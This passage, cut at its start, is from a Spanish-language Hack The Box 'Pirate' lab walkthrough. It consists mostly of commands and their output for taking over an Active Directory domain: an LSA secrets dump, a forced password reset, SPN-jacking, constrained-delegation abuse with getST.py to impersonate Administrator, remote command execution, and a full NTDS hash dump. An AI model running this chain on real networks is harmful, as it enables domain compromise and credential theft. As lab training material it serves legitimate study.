SMB         WEB01.pirate.htb 445    WEB01            _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000
SMB         WEB01.pirate.htb 445    WEB01            GMSA ID: a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11 NTLM: 841fae962662f0c2f0178d01d178ec3e
SMB         WEB01.pirate.htb 445    WEB01            [+] Dumped 12 LSA secrets to /root/.nxc/logs/lsa/WEB01_WEB01.pirate.htb_2026-11-25_031525.secrets and /root/.nxc/logs/lsa/WEB01_WEB01.pirate.htb_2026-11-25_031525.cached
```

A continuación, verificamos las credenciales de `a.white` que funcionen.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb DC01.pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu'
SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.100.1   445    DC01             [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu
```

Finalmente, tenemos el path final para adquirir el DC01.
![[Pasted image 20261124201936.png]]

Primero le cambiaremos la contraseña a `a.white_adm`.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  bloodyAD --host DC01.pirate.htb -d pirate.htb -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' set password "CN=ANGELA W. ADM,CN=USERS,DC=PIRATE,DC=HTB" 'Cibaism01!'
[+] Password changed successfully!
```

Todo seguido verificaremos que las credenciales se han aplicado.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  nxc smb DC01.pirate.htb -u 'a.white_adm' -p 'Cibaism01!'
SMB         192.168.100.1   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.100.1   445    DC01             [+] pirate.htb\a.white_adm:Cibaism01!
```

Ahora al ser `a.white_adm`, pertenecemos al grupo `IT` que nos permite realizar un `Write SPN` hacía el `DC01`. En este caso podemos realizar un `SPN-jacking` desde `WEB01$` hacía `DC01$`. Ya que WEB01 tiene `HTTP/WEB01.pirate.htb`. Entonces la estrategia es la siguiente: mueve `HTTP/WEB01.pirate.htb` de `WEB01$` a `DC01$`.

Con la contraseña de a.white_adm, eliminamos el SPN de WEB01 y lo añadimos a DC01
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  bloodyAD -H DC01.pirate.htb -d pirate.htb -u 'a.white_adm' -p 'Cibaism01!' msldap delspn 'CN=WEB01,CN=Computers,DC=pirate,DC=htb' 'HTTP/WEB01.pirate.htb'
SPN removed!

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  bloodyAD -H DC01.pirate.htb -d pirate.htb -u 'a.white_adm' -p 'Cibaism01!' msldap addspn 'CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb' 'HTTP/WEB01.pirate.htb'
SPN added!
```

Luego, como `a.white_adm` tiene delegación restringida hacia ese SPN, solicitam un ticket para Administrator y cambiamos el servicio del ticket a CIFS de DC01:
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f getST.py 'PIRATE.HTB/a.white_adm:Cibaism01!' -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 192.168.100.1 -altservice CIFS/DC01.pirate.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

Finalmente, nos autenticamos como Domain Admin (`Administrator`) al DC01.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  export KRB5CCNAME=$(pwd)/Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f nxc smb DC01.pirate.htb --use-kcache
SMB         DC01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.pirate.htb 445    DC01             [+] PIRATE.HTB\Administrator from ccache (admin)
```

```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f nxc smb DC01.pirate.htb --use-kcache -x 'whoami'
SMB         DC01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.pirate.htb 445    DC01             [+] PIRATE.HTB\Administrator from ccache (admin)
SMB         DC01.pirate.htb 445    DC01             [+] Executed command via wmiexec
SMB         DC01.pirate.htb 445    DC01             pirate\administrator
```

Finalmente, realizamos un paso opcional para la post explotación, volcamos todos los NTLM del dominio.
```sh
╭─ root [at] exegol-htb 🎭 [on]  /home/htb/labs/Pirate
╰─ >>  f nxc smb DC01.pirate.htb --use-kcache --ntds
SMB         DC01.pirate.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.pirate.htb 445    DC01             [+] PIRATE.HTB\Administrator from ccache (admin)
SMB         DC01.pirate.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         DC01.pirate.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
SMB         DC01.pirate.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         DC01.pirate.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33071738496aba54a991ccc80875c97e:::
SMB         DC01.pirate.htb 445    DC01             pirate.htb\a.white_adm:1104:aad3b435b51404eeaad3b435b51404ee:fe91e200797974114ae1c324832e2def:::
SMB         DC01.pirate.htb 445    DC01             pirate.htb\a.white:3101:aad3b435b51404eeaad3b435b51404ee:d2593a013aaf8e077ab0e69f9471b4c1:::
SMB         DC01.pirate.htb 445    DC01             pirate.htb\pentest:4106:aad3b435b51404eeaad3b435b51404ee:32e1d98aef1071b86d5132f6bb18f3fa:::
SMB         DC01.pirate.htb 445    DC01             pirate.htb\j.sparrow:4110:aad3b435b51404eeaad3b435b51404ee:cfea2c42c4e9e5a1ac6b7ed4b9a9f518:::
SMB         DC01.pirate.htb 445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:230600b8b669ffa1dccf403058170dae:::
SMB         DC01.pirate.htb 445    DC01             WEB01$:3102:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
SMB         DC01.pirate.htb 445    DC01             MS01$:4102:aad3b435b51404eeaad3b435b51404ee:b80b20b63597d94d0e5c95d119a11c60:::
SMB         DC01.pirate.htb 445    DC01             EXCH01$:4103:aad3b435b51404eeaad3b435b51404ee:bc74a7036b998a5e098615df5af3dfb8:::
SMB         DC01.pirate.htb 445    DC01             gMSA_ADCS_prod$:4105:aad3b435b51404eeaad3b435b51404ee:1b8d03fd488dfb31f30271d734c4b516:::
SMB         DC01.pirate.htb 445    DC01             gMSA_ADFS_prod$:4108:aad3b435b51404eeaad3b435b51404ee:a008939426f29c67d3002a16029ab145:::
SMB         DC01.pirate.htb 445    DC01             [+] Dumped 13 NTDS hashes to /root/.nxc/logs/ntds/DC01_DC01.pirate.htb_2026-11-25_033511.ntds of which 7 were added to the database
SMB         DC01.pirate.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command:
SMB         DC01.pirate.htb 445    DC01             [*] cat /root/.nxc/logs/ntds/DC01_DC01.pirate.htb_2026-11-25_033511.ntds | grep -iv disabled | cut -d ':' -f1
SMB         DC01.pirate.htb 445    DC01             [*] grep -iv disabled /root/.nxc/logs/ntds/DC01_DC01.pirate.htb_2026-11-25_033511.ntds | cut -d ':' -f1
```